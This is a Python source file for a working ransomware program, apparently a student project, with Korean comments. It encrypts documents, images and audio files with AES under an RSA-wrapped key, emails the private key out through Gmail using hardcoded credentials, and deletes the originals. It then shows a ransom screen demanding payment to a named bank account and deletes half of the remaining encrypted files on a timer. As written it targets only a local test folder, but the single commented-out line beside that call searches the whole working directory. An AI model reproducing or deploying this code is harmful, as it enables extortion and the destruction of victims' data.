from tkinter import messagebox

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP
import os
import sys
import random
import threading
from time import sleep

import smtplib
import uuid
import poplib
from email.mime.text import MIMEText

import tkinter
from tkinter.ttk import Label
from PIL import Image, ImageTk

iv = os.urandom(16)
UUID = uuid.getnode()
ext_list = \
    ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
     'jpg', 'jpeg', 'png', 'gif',
     'mp3', 'wav', 'wma',
     'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']


class AnimatedGIF(Label, object):
    def __init__(self, master, path, forever=True):
        self._master = master
        self._loc = 0
        self._forever = forever

        self._is_running = False

        im = Image.open(path)
        self._frames = []
        i = 0
        try:
            while True:
                photoframe = ImageTk.PhotoImage(im.copy().convert('RGBA'))
                self._frames.append(photoframe)

                i += 1
                im.seek(i)
        except EOFError:
            pass

        self._last_index = len(self._frames) - 1

        try:
            self._delay = im.info['duration']
        except:
            self._delay = 100

        self._callback_id = None

        super(AnimatedGIF, self).__init__(master, image=self._frames[0])

    def start_animation(self, frame=None):
        if self._is_running:
            return

        if frame is not None:
            self._loc = 0
            self.configure(image=self._frames[frame])

        self._master.after(self._delay, self._animate_GIF)
        self._is_running = True

    def stop_animation(self):
        if not self._is_running:
            return

        if self._callback_id is not None:
            self.after_cancel(self._callback_id)
            self._callback_id = None

        self._is_running = False

    def _animate_GIF(self):
        self._loc += 1
        self.configure(image=self._frames[self._loc])

        if self._loc == self._last_index:
            if self._forever:
                self._loc = 0
                self._callback_id = self._master.after(self._delay, self._animate_GIF)
            else:
                self._callback_id = None
                self._is_running = False
        else:
            self._callback_id = self._master.after(self._delay, self._animate_GIF)

    def pack(self, start_animation=True, **kwargs):
        if start_animation:
            self.start_animation()
        super(AnimatedGIF, self).pack(**kwargs)

    def grid(self, start_animation=True, **kwargs):
        if start_animation:
            self.start_animation()
        super(AnimatedGIF, self).grid(**kwargs)

    def place(self, start_animation=True, **kwargs):
        if start_animation:
            self.start_animation()

        super(AnimatedGIF, self).place(**kwargs)

    def pack_forget(self, **kwargs):
        self.stop_animation()
        super(AnimatedGIF, self).pack_forget(**kwargs)

    def grid_forget(self, **kwargs):
        self.stop_animation()
        super(AnimatedGIF, self).grid_forget(**kwargs)

    def place_forget(self, **kwargs):
        self.stop_animation()
        super(AnimatedGIF, self).place_forget(**kwargs)


def resource_path(relative_path):
    print(getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__))))
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    print(os.path.join(base_path, relative_path))
    return os.path.join(base_path, relative_path)


class MyTk:
    def __init__(self):
        self.pw = ""
        self.window = tkinter.Tk()
        self.window.title("ransomware")
        self.window.state('zoomed')  # maximize the window
        self.window.configure(background="black")

        self.l_text = tkinter.Label(self.window,
                                    text="\nYOUR FILES HAVE BEEN ENCRYPTED."
                                         "\nYour photos, documents, etc..."
                                         "\nBut, don't worry! I have not deleted them yet :D"
                                         "\nYou have some time to pay 10,000,000KRW in our account to get the decryption key."
                                         "\nSend the money to the account below, and send the details and your UUID to the below e-mail."
                                         "\nOUR ACCOUNT : KB 786102-00-040854"
                                         "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
                                         "\nYOU UUID : " + str(UUID) +
                                         "\nIf you dont, every hour half of all files will be deleted."
                                         "\n------WARNING------"
                                         "\nDo not terminate this program."
                                         "\nYou will NEVER decrypt your files."
                                         "\n",
                                    fg="green", bg="black", font='Helvetica 14 bold')
        self.l_text.pack()

        self.l_timer = tkinter.Label(self.window, text="Start the timer!", fg="red", bg="black",
                                     font='Helvetica 24 bold')
        self.l_timer.pack()

        self.l_input = tkinter.Label(self.window,
                                     text="\nPassword:",
                                     fg="green", bg="black", font='Helvetica 14 bold')
        self.l_input.pack()

        self.password = tkinter.Entry(self.window)
        self.password.pack()

        self.pw_button = tkinter.Button(self.window, text="Decode", command=self.key_submit, disabledforeground='green')
        self.pw_button.pack()

        self.thanos = tkinter.PhotoImage(file=resource_path("ui/face.png"))
        self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                      highlightthickness=0)
        self.l_thanos.pack()

    def key_submit(self):
        self.pw = str(self.password.get())

        self.l_input.config(text=" The keys are being checked ... ")
        self.pw_button.config(state='disabled')

        if check_key(self.pw):
            self.all_decrypted()
        else:
            self.pw_button.config(state='normal')
            self.l_input.config(text=" It's the wrong key.")

    def all_decrypted(self):
        self.l_timer.destroy()
        self.l_input.destroy()
        self.password.destroy()
        self.pw_button.destroy()
        self.l_thanos.destroy()

        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')

        self.final_image = tkinter.PhotoImage(file=resource_path("ui/final_thanos.png"))
        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
        self.l_final.pack()

    def all_removed(self):
        self.l_timer.destroy()
        self.l_input.destroy()
        self.password.destroy()
        self.pw_button.destroy()
        self.l_thanos.destroy()

        self.l_text.config(text="\n\n\n\nAll your files are deleted.\n\n", fg="red",
                           font='Helvetica 50 bold')

        sleep(5)
        self.window.destroy()


def enc(key, cipher, in_filename, out_filename=None):
    ciphertext = cipher.encrypt(key)  # 128비트
    mode = AES.MODE_CBC

    if not out_filename:
        out_filename = in_filename + '.antdd'

    with open(in_filename, 'rb') as infile:
        data = infile.read()
        size_of_data = len(data)
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length

        with open(out_filename, 'wb') as outfile:
            pass

        with open(out_filename, 'ab') as outfile:  # 이어쓰기 모드
            # RSA : 길이 11 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
            outfile.write(b'0' * (11 - len(str(size_of_data))) + str(size_of_data).encode())

            # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
            outfile.write(ciphertext)
            encryptor = AES.new(key, mode, iv)
            e_data = encryptor.encrypt(data)
            outfile.write(e_data)


def dec(cipher, in_filename, out_filename=None):
    mode = AES.MODE_CBC

    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        e_data = infile.read()

        # RSA : 파일의 크기와 암호화된 AES 키 추출
        size_of_data = e_data[:11].lstrip(b'0').decode()
        # 크기가 0 바이트일 때
        if size_of_data == '':
            return
        size_of_data = int(size_of_data)
        aes_key_enc = e_data[11:139]  # 암호화된 aes 키 (128바이트)

        # RSA : 암호화된 진짜 원본 데이터 추출
        e_data = e_data[139:]

        # RSA : 추출한 AES 키 복호화
        aes_key_dec = cipher.decrypt(aes_key_enc)

        with open(out_filename, 'wb') as outfile:
            decryptor = AES.new(aes_key_dec, mode, iv)
            d_data = decryptor.decrypt(e_data)
            d_data = d_data[:size_of_data]
            outfile.write(d_data)


def remove_files(gui, remove_file_list):
    gui.l_thanos.destroy()
    gui.l_thanos = AnimatedGIF(gui.window, resource_path("ui/thanos1.gif"))
    gui.l_thanos.pack()

    sleep(2)
    random.shuffle(remove_file_list)

    if len(remove_file_list) >= 2:
        n = len(remove_file_list) // 2
        for i in range(n):
            os.remove(remove_file_list[i])

    elif len(remove_file_list) == 1:
        os.remove(remove_file_list[0])
        gui.listWindow.destroy()
        gui.all_removed()

    gui.l_thanos.pack_forget()
    gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos, borderwidth=0, compound="center", highlightthickness=0)
    gui.l_thanos.pack()

    gui.listWindow.destroy()

    start_timer(gui, os.getcwd())  # @@


def search_dir(file_list,dir_path):
    for name in os.listdir(dir_path):
        if os.path.isfile(os.path.join(dir_path,name)):
            for i in ext_list:
                if name.endswith(i):
                    file_list.append(os.path.join(dir_path,name))
        elif os.path.isdir(os.path.join(dir_path,name)):
            search_dir(file_list,os.path.join(dir_path,name))


def enc_search_dir(file_list,dir_path):
    for name in os.listdir(dir_path):
        if os.path.isfile(os.path.join(dir_path,name)):
            if name.endswith('.antdd'):
                file_list.append(os.path.join(dir_path,name))
        elif os.path.isdir(os.path.join(dir_path,name)):
            enc_search_dir(file_list,os.path.join(dir_path,name))


def start_timer(gui, path, ext=None):
    sleep(1)

    antdd_file_list = []

    enc_search_dir(antdd_file_list, path)

    if len(antdd_file_list) == 0:
        gui.all_removed()
        return

    gui.listWindow = tkinter.Toplevel(gui.window)
    gui.listWindow.title('Encrypt File You Have')
    gui.listWindow.geometry("800x400")
    gui.listWindow.configure(background="black")
    gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_file_list]),
                             background="black", fg="green",
                             font='Helvetica 14 bold')
    gui.listWindow.lift()
    gui.list.pack()

    clock(gui, 3, antdd_file_list)


def clock(gui, sec, antdd_file_list):
    sec -= 1

    # 0초가 되면!
    if sec == -2:
        # 파일 삭제를 시작함
        remove_files(gui, antdd_file_list)
        return

    # 분초로 타이머 나타내기
    gui_min = (sec + 1) // 60
    gui_sec = (sec + 1) % 60
    min_sec = str(gui_min) + " : " + str(gui_sec)

    # gui의 타이머 label 을 갱신!
    gui.l_timer.config(text=min_sec)

    # 자기 자신 호출
    threading.Timer(1, clock, [gui, sec, antdd_file_list]).start()


def check_key(gui_input=None):
    # 서버와 연동/ 로그인
    SERVER = "pop.gmail.com"
    server = poplib.POP3_SSL(SERVER)
    server.user('secureantdd@gmail.com')
    server.pass_('antdd1234')

    # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
    for i in range(len(server.list()[1]),0,-1):
        msg = server.retr(i)[1]
        uuid = msg[12].decode()[msg[12].decode().find(':') + 2:].strip()
        key = b'\n'.join(msg[15:]).decode()

        # 만약 같은 주소의 사용자에게 온 메일이 있다면
        if uuid == str(UUID):
            # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
            if key.strip() == gui_input.strip():
                # 해당 메일 삭제
                server.dele(i)
                server.quit()

                # 복호화 및 타겟파일 삭제
                dec_target_list = []
                enc_search_dir(dec_target_list, os.getcwd())
                for dec_target in dec_target_list:
                    dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                    os.remove(dec_target)
                return True
    return False

class RealMain:

    def __init__(self):
        self.key = os.urandom(16)

        # RSA : 키, 싸이퍼 생성
        self.random_generator = Random.new().read
        self.rsa_key = RSA.generate(1024, self.random_generator)  # 키 정보 객체
        self.public_key = self.rsa_key.publickey().export_key()  # 공개키
        self.private_key = self.rsa_key.export_key()  # 비밀키

        self.gui = MyTk()

    def run(self):
        # smtp 로그인 후 비밀키 전송
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.ehlo()  # say Hello
        smtp.starttls()  # TLS 사용시 필요
        smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!

        msg = MIMEText(self.private_key.decode())  # RSA개인키 를 메세지로 전송함

        msg['Subject'] = str(UUID)  # 사용자의 Mac 주소를 제목으로 전송
        msg['To'] = 'secureantdd@gmail.com'
        smtp.sendmail('secureantdd@gmail.com', 'antdd1234', msg.as_string())

        smtp.quit()

        enc_target_list = []
        # search_dir(enc_target_list, os.getcwd())
        search_dir(enc_target_list, os.path.join(os.getcwd(), 'test'))

        for enc_target in enc_target_list:
            if enc_target.split('.')[-1] == 'antdd':
                continue
            enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target,
                out_filename=None)
            os.remove(enc_target)

        th1 = threading.Thread(target=start_timer, args=[self.gui, os.getcwd()])  # @@
        th1.daemon = True
        th1.start()

       # self.gui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
        self.gui.window.mainloop()


if __name__ == "__main__":

    if not os.path.isdir(os.path.join(os.getcwd(), 'test')):
        os.makedirs(os.path.join(os.getcwd(), 'test'))
    for i in range(2):
        with open("test/test" + str(i) + '.txt', 'wb') as testfile:
            testfile.write('테스트입니다'.encode())
    r = RealMain()
    r.run()
